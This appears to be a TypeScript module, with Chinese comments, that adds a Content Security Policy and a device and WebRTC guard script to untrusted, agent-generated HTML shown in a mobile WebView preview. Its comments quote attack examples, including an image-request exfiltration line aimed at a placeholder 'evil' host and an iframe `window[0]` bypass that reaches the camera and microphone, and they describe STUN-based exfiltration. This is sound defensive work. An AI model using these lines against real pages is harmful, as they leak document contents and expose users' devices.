/**
 * 给 HTML 预览文档注入内容安全策略(CSP)。
 *
 * 为什么需要:预览的是 agent 产出、可能受提示注入影响的**不可信**文档,而渲染态要保留
 * JavaScript(设计稿的标签切换等交互依赖它)。而 `onShouldStartLoadWithRequest` **只管
 * 导航**,完全不经过子资源请求 —— 一段
 * `new Image().src = 'https://evil/?d=' + encodeURIComponent(document.body.innerText)`
 * 会在用户打开预览的那一刻静默把文档正文发出去,导航回调一无所知(review P1 实捉)。
 *
 * 所以出网必须由**渲染引擎强制**关闭,而不是靠我们在导航回调里约定。这里用 meta CSP
 * 关掉 CSP 管得到的全部出口:子资源、`fetch` / `XHR`、表单、iframe、插件。配套的另一半在
 * HtmlFileReader:顶层导航只放行 `about:`,连用户点击的外链也不外送。
 *
 * 代价(刻意接受,PR 已写明):公网 https 图片 / 字体 / 脚本在预览里**不再加载**。
 * 允许它们就等于留一条 `img-src https:` 的外传通道(`new Image().src='…?d=…'` 正是最经典的
 * 姿势),那会让上面整段封锁形同虚设。
 *
 * ── ⚠️ 残留信道:WebRTC(**不要把本模块说成「零出网」**) ────────────────────
 * `RTCPeerConnection` 的 ICE / STUN / DTLS 流量**不受 CSP 各 `*-src` 指令管辖** —— 恶意脚本
 * 可以把文档内容编码进 STUN 服务器域名,或直接与固定 peer 建数据通道外传,全程不经过导航
 * 回调、也不产生任何 CSP 管辖的 URL 请求(review P1 实捉)。本文件与 HtmlFileReader 早先的
 * 注释把这套封锁描述成绝对的,**那是错的**,已改;守卫用例禁止那类措辞回归。
 *
 * 已做的收窄:
 *  - `webrtc 'block'`(CSP3):**实测在任何平台都没有生效,不要把它当成封锁依据**。
 *    早先这里照着 CSP3 spec 推断它在 Chromium 系已落地、于是断言 Android 那一侧被它封住 ——
 *    那个推断**没有实测**,是错的。实机验(Chrome 150.0.7871.187,远高于 spec 标注的版本):
 *    经 `<meta http-equiv>` 与 HTTP `Content-Security-Policy` 响应头**两种下发方式**,
 *    顶层 `new RTCPeerConnection()` 都照常构造成功 —— 该指令在当前引擎里是装饰品。
 *    iOS 的 WKWebView(WebKit)本来就不认。**指令保留**(未知/未实现指令被引擎忽略,零副作用,
 *    将来引擎真落地了自动生效),但当前对 WebRTC 的实际封锁**只来自下面那段 guard 删构造函数**,
 *    而 guard 只作用于顶层 realm。守卫用例禁止「那一侧真封住」这类措辞回归。
 *  - `mediaCapturePermissionGrantType="deny"`(见 HtmlFileReader):挡掉摄像头 / 麦克风取用,
 *    **但只在 iOS 生效** —— Android 的同名 setter 是空函数,详见下面 guard 的注释。
 *    它**不能**关闭 WebRTC 外传 —— 纯数据通道与 STUN 候选收集都不需要媒体权限;这条是
 *    「不可信页面不该弹权限框」本身的正确做法,不要当成 WebRTC 的解。
 *
 * 逐平台、逐 realm 的完整残留见下面 guard 注释里的**实测矩阵**;要完整闭合只有
 * `javaScriptEnabled={false}` 一条路,那会让带交互的产物(标签切换、折叠、图表)退化成静态页
 * —— 属产品取舍,已在 PR 描述里显式提给放行人裁决,本层不擅自决定。
 *
 * 与「同目录资源透传」的关系(见 htmlLocalResources,栈上一层):资源一律以 `data:` URI
 * 内联、页面里不出现任何 bearer 凭证。那条路把被控端的文件内容带进页面,更需要这里的
 * 封锁 —— 但封锁本身属于「在 WebView 里渲染不可信 HTML」这件事,所以留在这一层。
 */

/** 预览文档的策略:默认全拒,只放行内联与 data: 资源,CSP 管得到的出口一律关闭。 */
export const HTML_PREVIEW_CSP = [
  "default-src 'none'",
  "img-src data:",
  "media-src data:",
  "font-src data:",
  "style-src 'unsafe-inline' data:",
  "script-src 'unsafe-inline' data:",
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
  "frame-src 'none'",
  "object-src 'none'",
  // **实测未生效**(Chrome 150 上 meta 与 HTTP 头两种下发都不拦),留着是等引擎将来实现;
  // 未实现的指令被忽略、不影响其余策略。当前 WebRTC 的实际封锁来自 guard,见头注。
  "webrtc 'block'",
].join('; ');

const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`;

/**
 * 设备与 WebRTC 面的剥离脚本 —— **必须是文档里第一段脚本**。
 *
 * ── 为什么用内联脚本而不是 WebView prop / native patch(review P0) ────────────
 * `mediaCapturePermissionGrantType="deny"` **只在 iOS 生效**:Android 侧
 * `RNCWebViewManager.java` 的 setter 是空函数(已在 node_modules 里核实
 * `setMediaCapturePermissionGrantType(RNCWebViewWrapper view, @Nullable String value) {}`),
 * 权限实际由 `RNCWebChromeClient.onPermissionRequest` 按 **app 级 OS 运行时权限**判定 ——
 * 用户为语音输入 / 拍照附件授过 `RECORD_AUDIO` / `CAMERA` 之后(常见状态),这个"离线沙箱"里
 * 的任意不可信 HTML 都能零提示拿到实时音视频流。react-native-webview 也没有暴露
 * `onPermissionRequest` 之类的回调可供拒绝。
 *
 * 两条备选都不划算:
 *  - **patch 原生**(`dependency-patches/react-native-webview@13.16.1.patch` 机制已在):改的是
 *    Android Java,会变动原生构建 → 触发冷更门,需要把关人对冷更单独确认,代价远大于本修复;
 *  - **`injectedJavaScriptBeforeContentLoaded`**:与解析赛跑(Android 靠 `onPageStarted` 触发),
 *    作者脚本可能先跑,是 mitigation 不是 fix。
 *
 * 而这段脚本拼在文档最前面,**由解析器保证先于任何作者脚本执行,没有竞态** —— 与 CSP meta
 * 同一个位置、同一个理由。它把能力面直接删掉,不依赖任何平台的权限实现是否正确。
 *
 * **必须同时盖原型**:只在 `navigator` 上建同名遮蔽属性,只挡住 `navigator.x` 这种写法,
 * 原型方法仍可 `Navigator.prototype.webkitGetUserMedia.call(navigator, ...)` 取出来直接调
 * (review P1 实捉,上一版漏了两个前缀变体)。所以名单 × {实例, 原型} 两处一起盖。
 *
 * 属性用 `writable: false, configurable: false` 定死,重定义会抛。
 *
 * ── ⚠️ 残留:**子 browsing context 拿得到未加固的 realm** ────────────────────
 * 早先这里写过「CSP 的 `frame-src 'none'` / `object-src 'none'` 封掉了 iframe,所以作者拿不到
 * 干净 realm」。**那是错的**(review P1 实捉,已实测确认):`frame-src` 管的是 frame 的**导航**,
 * 而无 `src` 的 iframe 会**同步**得到一个初始 `about:blank` 子上下文 —— 不发生 fetch、CSP 不介入。
 * 实测(headless Chromium)加固页与裸页拿到的绕过路径完全相同:
 *   `iframe.contentWindow.RTCPeerConnection` / `.navigator.mediaDevices` 都是原装的。
 *
 * 本脚本现在封掉了**便捷取法**(四类嵌入元素的 `contentWindow` / `contentDocument` 恒 null),
 * 但**封不住索引取法**:`window[0]` / `window.frames[0]` 仍指向子 realm,而
 * `Object.defineProperty(window,'0',…)` 在 WindowProxy 上直接抛
 * `TypeError: Failed to set an indexed property` —— 无法覆写。而且 iframe 根本不需要脚本创建:
 * 不可信 HTML 里直接写一个 `<iframe>`,解析期就有子上下文了。
 *
 * ── 实测残留矩阵(逐格都有依据,别再凭 spec 推) ──────────────────────────────
 * 顶层 realm 由本 guard 覆盖;子 realm 指不可信 HTML 里直接写一个 `<iframe>` 得到的初始
 * `about:blank` 上下文 —— 它**不需要脚本创建**,解析期就在,`window[0]` 即可取到。
 *
 *   能力面              顶层 realm          子 realm(srcless iframe)
 *   ─────────────────── ─────────────────── ─────────────────────────────────────
 *   fetch / XHR 外传     CSP connect-src     **封住** —— about:blank 继承父文档 CSP(实测)
 *   mic / camera · iOS   guard 删属性        **封住** —— 原生 mediaCapturePermissionGrantType
 *                                            ="deny" 在原生层判定,不分 realm
 *   mic / camera · Andr  guard 删属性        **可达** —— setter 是空函数,实际由
 *                                            RNCWebChromeClient.onPermissionRequest 判 app 级
 *                                            OS 权限;已授权则**同步 grant、零提示**
 *   WebRTC 外传 · 两端   guard 删构造函数    **可达** —— webrtc 'block' 实测无效(见上),
 *                                            CSP 各 *-src 管不到 ICE/STUN/DTLS
 *
 * **结论(如实记录,不要再声称已封死)**:只要 JavaScript 开着,文档层就无法保证「设备能力
 * 与 WebRTC 对不可信 HTML 完全不可达」—— 上表右列那两个「可达」格子,是**一行代码可达**,
 * 不是理论残留:`<iframe></iframe><script>window[0].navigator.mediaDevices.getUserMedia(…)</script>`。
 * 要完整闭合只有两条路,都属产品/发布层决定:
 *  1. `javaScriptEnabled={false}` —— 没有作者脚本,右列**整列**随之消失(带交互的产物退化成静态页);
 *  2. 在原生权限层统一 deny —— 能补上 Android 的 mic/camera 那一格(原生层不分 realm),但
 *     **补不上 WebRTC 那一格**(两端都无对应原生开关),而且改 Android Java 会变动原生构建 →
 *     触发冷更门,需把关人针对冷更单独确认。
 * 已在 PR 描述里列成待裁决项。
 *
 * **这不改变「预览保留 JavaScript」这个已定的产品取舍** —— 脚本照旧执行,顶层没有摄像头、
 * 麦克风与 WebRTC 三样能力;上表是这个取舍的完整代价,交给放行人看。
 *
 * ⚠️ 脚本文本里**不得出现 `</script>`**,否则会提前闭合(这里没有,用例钉住)。
 */
const DEVICE_SURFACE_GUARD = '<script>(function(){'
  + 'var freeze=function(o,k){try{Object.defineProperty(o,k,'
  + '{value:undefined,writable:false,configurable:false});}catch(e){}};'
  // **每个名字都盖「实例 + 原型」两处** —— 写成一个 both() 而不是逐条列举,是因为上一版
  // 只给 mediaDevices / getUserMedia 盖了原型、漏了两个前缀变体,于是
  // `Navigator.prototype.webkitGetUserMedia.call(navigator, ...)` 能绕过守卫(review P1 实捉)。
  // 遮蔽实例属性只挡住 `navigator.x` 这一种写法,原型方法照旧可以 .call 出来。
  // 用一份名单 × 两个目标,漏一边在结构上就不可能了 —— 以后加名字也不会再漏。
  + 'var both=function(k){freeze(navigator,k);'
  + 'try{freeze(Navigator.prototype,k);}catch(e){}};'
  + 'try{'
  + "['mediaDevices','getUserMedia','webkitGetUserMedia','mozGetUserMedia']"
  + '.forEach(both);'
  + "['RTCPeerConnection','webkitRTCPeerConnection','RTCDataChannel']"
  + '.forEach(function(k){freeze(window,k);});'
  // 兜底一层:MediaDevices 实例本应取不到(上面已盖两处),但若某引擎另有取法,
  // 把原型方法也盖掉,代价一行。
  + "if(typeof MediaDevices!=='undefined'&&MediaDevices.prototype)"
  + "{freeze(MediaDevices.prototype,'getUserMedia');}"
  // 子 browsing context 的**便捷取法**一并封掉(review P1):无 src 的 iframe 会同步得到一个
  // 未加固的初始 about:blank realm,`iframe.contentWindow.RTCPeerConnection` 就绕过了上面
  // 全部冻结。这里把四类嵌入元素的 contentWindow / contentDocument 取值器改成恒 null。
  // ⚠️ 这**不是完整封锁**,残留见头注「子 realm」一节 —— `window[0]` 挡不住。
  + "['HTMLIFrameElement','HTMLFrameElement','HTMLObjectElement','HTMLEmbedElement']"
  + '.forEach(function(n){try{var C=window[n];if(C&&C.prototype){'
  + "['contentWindow','contentDocument'].forEach(function(k){"
  + 'try{Object.defineProperty(C.prototype,k,'
  + '{get:function(){return null;},configurable:false});}catch(e){}});'
  + '}}catch(e){}});'
  + '}catch(e){}})();</scr' + 'ipt>';

/** 我们自己的前导段:标准模式 + 策略 + 能力剥离,一次性拼在最前面。 */
const CSP_PROLOG = `<!doctype html>${CSP_META}${DEVICE_SURFACE_GUARD}`;

/**
 * 给文档加上 CSP。**不去定位作者写在哪的 doctype —— 自己前置一个。**
 *
 * ── 为什么改成这样(root cause,别再"优化"回定位方案) ──────────────────────
 * 原实现试图找到作者的 doctype、把 meta 插在它后面(为了不让文档掉进 quirks mode)。
 * 那条路要求我们**用手写扫描去解析 HTML 前导段**,而前导段能出现的 token 是开放集合:
 * 空白、BOM、`<!-- -->`、`<?xml ?>` / `<?php ?>` 等处理指令、CDATA…… review 因此连挖三轮
 * (紧贴开头 → 前导注释 → 处理指令),每补一个 token 就还剩下一个。这不是边界没修够,
 * 是**方法错**:定位作者 doctype 需要真正的 HTML 前导解析器,不该在业务代码里手写。
 *
 * 现在把问题消掉而不是解决它:**总是自己前置 `<!doctype html>` + CSP meta**,原文整份跟在
 * 后面一字不动。于是「插在哪」不存在,上面那一整类 token 也不需要认识:
 *  - 原文自带 doctype → 解析器先见我们的、已进标准模式;原文那个按 HTML 规范在
 *    "in body" 插入模式被忽略(parse error, ignore the token),无副作用;
 *  - 原文以 `<?xml ?>` / `<?php ?>` / 注释 / CDATA 开头 → 它们照旧变 bogus comment,
 *    与不加策略时的解析结果一致;
 *  - 策略仍在**任何作者内容之前**生效 —— 这是 meta CSP 唯一安全的位置(见下)。
 * 唯一需要单独处理的是 BOM:必须前移到我们的前导段之前,否则会变成文档中间的游离字符。
 *
 * ⚠️ 仍然**刻意不去找 `<head>`**(review P1,两个 bot 各报过一次):找 `<head>` 的正则会
 * 命中注释里的假标签(`<!-- <head> -->`),CSP 被插进注释、策略整份失效;即使命中真的
 * `<head>`,它**之前**的内容(浏览器会照常执行前置 `<script>`)仍在策略生效前跑。
 *
 * 已知代价(刻意接受):**原本没有 doctype、依赖 quirks mode 排版的产物会变成标准模式。**
 * agent 生成的 HTML 基本都自带 `<!doctype html>`;而 quirks 模式的排版差异远小于「策略没生效」
 * 或「整份掉进 quirks」这两种旧失败模式。
 */
export function withHtmlPreviewCsp(html: string): string {
  // BOM 前移:它必须留在文档最前面,否则会成为游离字符。
  if (html.charCodeAt(0) === 0xfeff) return `\uFEFF${CSP_PROLOG}${html.slice(1)}`;
  return `${CSP_PROLOG}${html}`;
}
